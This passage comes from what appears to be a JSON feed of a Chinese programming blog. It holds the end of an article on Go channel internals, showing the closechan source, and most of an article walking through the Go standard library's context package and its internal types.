punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tcallerpc <span class=\"token operator\">:=</span> <span class=\"token function\">getcallerpc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token function\">racewritepc</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span><span class=\"token function\">raceaddr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> callerpc<span class=\"token punctuation\">,</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">FuncPCABIInternal</span><span class=\"token punctuation\">(</span>closechan<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token function\">racerelease</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span><span class=\"token function\">raceaddr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tc<span class=\"token punctuation\">.</span>closed <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token keyword\">var</span> glist gList</pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token comment\">// 释放所有在接收队列中的 goroutine</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\tsg <span class=\"token operator\">:=</span> c<span class=\"token punctuation\">.</span>recvq<span class=\"token punctuation\">.</span><span class=\"token function\">dequeue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> sg <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> sg<span class=\"token punctuation\">.</span>elem <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t<span class=\"token function\">typedmemclr</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>elemtype<span class=\"token punctuation\">,</span> sg<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\tsg<span class=\"token punctuation\">.</span>elem <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> sg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\tsg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">=</span> <span class=\"token function\">cputicks</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token comment\">// 将当前接收 goroutine 准备好</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\tgp <span class=\"token operator\">:=</span> sg<span class=\"token punctuation\">.</span>g</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\tgp<span class=\"token punctuation\">.</span>param <span class=\"token operator\">=</span> unsafe<span class=\"token punctuation\">.</span><span class=\"token function\">Pointer</span><span class=\"token punctuation\">(</span>sg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\tsg<span class=\"token punctuation\">.</span>success <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> raceenabled <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t\t<span class=\"token function\">raceacquireg</span><span class=\"token punctuation\">(</span>gp<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">raceaddr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\">// 将准备好的 goroutine 推到列表中</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\tglist<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>gp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token comment\">// 释放所有在发送队列中的 goroutine (they will panic)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\tsg <span class=\"token operator\">:=</span> c<span class=\"token punctuation\">.</span>sendq<span class=\"token punctuation\">.</span><span class=\"token function\">dequeue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> sg <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t\tsg<span class=\"token punctuation\">.</span>elem <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> sg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t\t\tsg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">=</span> <span class=\"token function\">cputicks</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\tgp <span class=\"token operator\">:=</span> sg<span class=\"token punctuation\">.</span>g</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t\tgp<span class=\"token punctuation\">.</span>param <span class=\"token operator\">=</span> unsafe<span class=\"token punctuation\">.</span><span class=\"token function\">Pointer</span><span class=\"token punctuation\">(</span>sg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t\tsg<span class=\"token punctuation\">.</span>success <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> raceenabled <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t\t\t<span class=\"token function\">raceacquireg</span><span class=\"token punctuation\">(</span>gp<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">raceaddr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t\tglist<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>gp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  <span class=\"token comment\">// 现在已经 unlock 准备所有 goroutine。</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token operator\">!</span>glist<span class=\"token punctuation\">.</span><span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t\tgp <span class=\"token operator\">:=</span> glist<span class=\"token punctuation\">.</span><span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t\tgp<span class=\"token punctuation\">.</span>schedlink <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\t<span class=\"token function\">goready</span><span class=\"token punctuation\">(</span>gp<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0xlb1lhbmc5MC9Hb2xhbmctSW50ZXJuYWwtTm90ZXMvYmxvYi9tYXN0ZXIvR28lMjBDaGFubmVsLm1k\">https://github.com/LeoYang90/Golang-Internal-Notes/blob/master/Go Channel.md</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2xlZ2VuZHRrbC5jb20vMjAxNy8wNy8zMC91bmRlcnN0YW5kaW5nLWdvbGFuZy1jaGFubmVsLw==\">http://legendtkl.com/2017/07/30/understanding-golang-channel/</span></p>\n",
            "tags": [
                "计算机科学",
                "GO",
                "Lib",
                "GO"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2025/Go/Lib/context/",
            "url": "https://blog.twelveeee.top/2025/Go/Lib/context/",
            "title": "golang 标准库源码解析 - Context",
            "date_published": "2025-04-01T09:00:00.000Z",
            "content_html": "<blockquote>\n<p>本文源码版本基于 go1.21.13</p>\n</blockquote>\n<h1 id=\"context\"><a class=\"anchor\" href=\"#context\">#</a> Context</h1>\n<p>标准库中的 Context 是一个接口，其具体实现有很多种，主要用于跨多个 Goroutine 设置截止时间、同步信号、传递上下文请求值等。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// Context 携带截止时间、取消信号和其他跨 API 边界的值。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// Context 的方法可能被多个 goroutine 同时调用。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">type</span> Context <span class=\"token keyword\">interface</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">// Deadline 返回代表此 context 完成的工作应被取消的时间。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">// 当未设置截止日期时，Deadline 返回 ok==false。连续调用 Deadline 会返回相同的结果。</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">Deadline</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>deadline time<span class=\"token punctuation\">.</span>Time<span class=\"token punctuation\">,</span> ok <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token comment\">// Done 返回一个 chan，当代表此 Context 完成工作时，该通道将被关闭。</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">// 如果此 Context 永远无法 cancel，则 Done 可能返回 nil。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token comment\">// 对 Done 的连续调用将返回相同的值。</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token comment\">// 如果 Done 尚未关闭，Err 将返回 nil。</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">// 如果 Done 已关闭，Err 将返回一个非零错误，解释原因：</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">// 如果 Context 被取消，则返回 Canceled</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token comment\">// 如果 Context 的截止时间已过，则返回 DeadlineExceeded。</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\">// Err 返回非零错误后，对 Err 的连续调用将返回相同的错误。</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">Err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token comment\">// Value 返回与此 context 关联的 key 值，如果没有与 key 关联的值，则返回 nil。</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token comment\">// 使用相同 key 连续调用 Value 将返回相同结果。</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token comment\">//context values 仅用于跨进程和 API 边界的请求范围数据传递，而非作为函数的可选参数进行传递。</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token comment\">//key 用于标识 Context 中的特定值。希望将值存储在 Context 中的函数通常会在全局变量中分配一个 key，然后将该 key 作为 context.WithValue 和 Context.Value 的参数。</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token comment\">//key 可以是任何支持相等比较的类型；</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\">// 为避免冲突，包应将 key 定义为 private 的类型。</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">Value</span><span class=\"token punctuation\">(</span>key any<span class=\"token punctuation\">)</span> any</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Done 的 demo 用法</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">Stream</span><span class=\"token punctuation\">(</span>ctx context<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">,</span> out <span class=\"token keyword\">chan</span><span class=\"token operator\">&lt;-</span> Value<span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        v<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> <span class=\"token function\">DoSomething</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> err</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">select</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>ctx<span class=\"token punctuation\">.</span><span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">return</span> ctx<span class=\"token punctuation\">.</span><span class=\"token function\">Err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">case</span> out <span class=\"token operator\">&lt;-</span> v<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Value 的 demo 用法</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// Package user defines a User type that's stored in Contexts.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">package</span> user</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token string\">\"context\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// User 是 Contexts 的值</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">type</span> User <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span><span class=\"token operator\">...</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//key 是此包中定义的 key 的未导出类型。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 这可以防止与其他包中定义的 key 发生冲突。</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">type</span> key <span class=\"token builtin\">int</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//userKey 是用户的 key。</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 用于 Context 中的用户值。该 key 是 private 的；</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 应使用 user.NewContext 和 user.FromContext 而非直接使用此 key。</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">var</span> userKey key</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// NewContext 返回一个新的 Context 携带 u 的值</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">NewContext</span><span class=\"token punctuation\">(</span>ctx context<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">,</span> u <span class=\"token operator\">*</span>User<span class=\"token punctuation\">)</span> context<span class=\"token punctuation\">.</span>Context <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> context<span class=\"token punctuation\">.</span><span class=\"token function\">WithValue</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">,</span> userKey<span class=\"token punctuation\">,</span> u<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">// FromContext 返回存储在 ctx 中的值</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">FromContext</span><span class=\"token punctuation\">(</span>ctx context<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>User<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    u<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> ctx<span class=\"token punctuation\">.</span><span class=\"token function\">Value</span><span class=\"token punctuation\">(</span>userKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>User<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> u<span class=\"token punctuation\">,</span> ok</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"context内部类型\"><a class=\"anchor\" href=\"#context内部类型\">#</a> Context 内部类型</h1>\n<h2 id=\"emptyctx\"><a class=\"anchor\" href=\"#emptyctx\">#</a> emptyCtx</h2>\n<p>emptyCtx 是一个没有 cancel 过的，没有 deadline 的，没有值的空 ctx。</p>\n<p>emptyCtx 是 backgroundCtx 和 todoCtx 的共同基础。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> emptyCtx <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>emptyCtx<span class=\"token punctuation\">)</span> <span class=\"token function\">Deadline</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>deadline time<span class=\"token punctuation\">.</span>Time<span class=\"token punctuation\">,</span> ok <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>emptyCtx<span class=\"token punctuation\">)</span> <span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>emptyCtx<span class=\"token punctuation\">)</span> <span class=\"token function\">Err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>emptyCtx<span class=\"token punctuation\">)</span> <span class=\"token function\">Value</span><span class=\"token punctuation\">(</span>key any<span class=\"token punctuation\">)</span> any <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"backgroundctx\"><a class=\"anchor\" href=\"#backgroundctx\">#</a> backgroundCtx</h2>\n<p><code>context.Background()</code>    返回一个 backgroundCtx ，本质上是 emptyCtx，主要用于 主函数、初始化、test case  作为请求的顶级 Contex 传入</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> backgroundCtx <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span> emptyCtx <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>backgroundCtx<span class=\"token punctuation\">)</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">\"context.Background\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">Background</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> Context <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> backgroundCtx<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"todoctx\"><a class=\"anchor\" href=\"#todoctx\">#</a> todoCtx</h2>\n<p><code>context.TODO()</code>  返回一个 todoCtx ，本质上是 emptyCtx，主要用于不清楚要用哪个 context 或者其他函数还没有开始定义接受 ctx 的参数，</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> todoCtx <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span> emptyCtx <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>todoCtx<span class=\"token punctuation\">)</span> <span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">\"context.TODO\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> Context <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> todoCtx<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"cancelctx\"><a class=\"anchor\" href=\"#cancelctx\">#</a> cancelCtx</h2>\n<p>可以被 canceled 的 ctx，当它 canceled 时，也会取消它的 children</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> cancelCtx <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    